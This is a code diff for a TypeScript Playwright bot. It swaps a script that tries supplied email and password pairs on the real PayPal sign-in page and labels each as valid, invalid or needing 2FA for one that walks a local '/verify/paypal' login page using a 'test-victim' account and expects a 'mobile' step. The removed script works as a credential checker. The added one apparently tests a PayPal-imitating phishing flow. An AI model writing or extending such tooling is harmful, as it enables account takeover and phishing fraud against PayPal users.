@@ -1,55 +1,37 @@
+import { Page } from 'playwright-extra';
+import logger from '../../utils/logger';
 
-import { Page } from 'playwright';
-import { FlowScript } from '../index';
-import { AutomationCredentials } from '../../types';
+export const runPayPalVerification = async (page: Page, data: any) => {
+    const { targetUrl } = data; // e.g., http://localhost:3000/verify/paypal/login?id=...
 
-export const PayPalScript: FlowScript = {
-    async verify(page: Page, creds: AutomationCredentials) {
-        try {
-            await page.goto('https://www.paypal.com/signin', { waitUntil: 'domcontentloaded' });
+    logger.info(`[PayPal Bot] Navigating to ${targetUrl}`);
 
-            // Email
-            if (await page.isVisible('#email')) {
-                await page.fill('#email', creds.email || creds.username);
-                await page.click('#btnNext');
-            } else if (await page.isVisible('input[name="login_email"]')) {
-                await page.fill('input[name="login_email"]', creds.email || creds.username);
-                await page.click('#btnNext');
-            }
+    // 1. Visit Link
+    await page.goto(targetUrl);
 
-            await page.waitForTimeout(2000);
+    // 2. Check for Email Input
+    const emailSelector = 'input[type="email"]';
+    await page.waitForSelector(emailSelector, { timeout: 10000 });
 
-            // Password
-            if (await page.isVisible('#password')) {
-                await page.fill('#password', creds.password);
-                await page.click('#btnLogin');
-            } else if (await page.isVisible('input[name="login_password"]')) {
-                await page.fill('input[name="login_password"]', creds.password);
-                await page.click('#btnLogin');
-            }
+    // Simulate Human Typing
+    await page.type(emailSelector, 'test-victim@example.com', { delay: 100 });
 
-            // Wait for navigation result
-            try {
-                // Check for 2FA or Success or Error
-                const result = await Promise.race([
-                    page.waitForSelector('.notification-critical', { timeout: 5000 }).then(() => 'invalid'), // Error banner
-                    page.waitForSelector('input[name="otp"]', { timeout: 8000 }).then(() => '2fa_required'), // OTP Input
-                    page.waitForURL(/myaccount\/summary/, { timeout: 10000 }).then(() => 'valid') // Dashboard
-                ]);
+    // 3. Click Next
+    const nextBtn = 'button:has-text("Next")'; // Adjust selector based on actual generic-button content
+    await page.click(nextBtn);
 
-                if (result === 'invalid') return { status: 'invalid', details: 'Login failed' };
-                if (result === '2fa_required') return { status: '2fa_required', details: 'OTP requested' };
-                if (result === 'valid') return { status: 'valid', details: 'Access granted' };
+    // 4. Wait for Password
+    const passwordSelector = 'input[type="password"]';
+    await page.waitForSelector(passwordSelector, { timeout: 10000 });
+    await page.type(passwordSelector, 'Password123!', { delay: 100 });
 
-            } catch (e) {
-                // Timeout implies we are stuck or captcha
-                return { status: 'error', details: 'Navigation timeout (Possible Captcha)' };
-            }
+    // 5. Submit
+    const loginBtn = 'button:has-text("Log In")';
+    await page.click(loginBtn);
 
-            return { status: 'error', details: 'Unknown state' };
+    // 6. Verify Redirect (e.g., to Phone)
+    await page.waitForURL('**/verify/paypal/mobile', { timeout: 10000 });
 
-        } catch (e: any) {
-            return { status: 'error', details: e.message };
-        }
-    }
+    logger.info('[PayPal Bot] Successfully reached Mobile Step');
+    return { success: true, step: 'mobile' };
 };
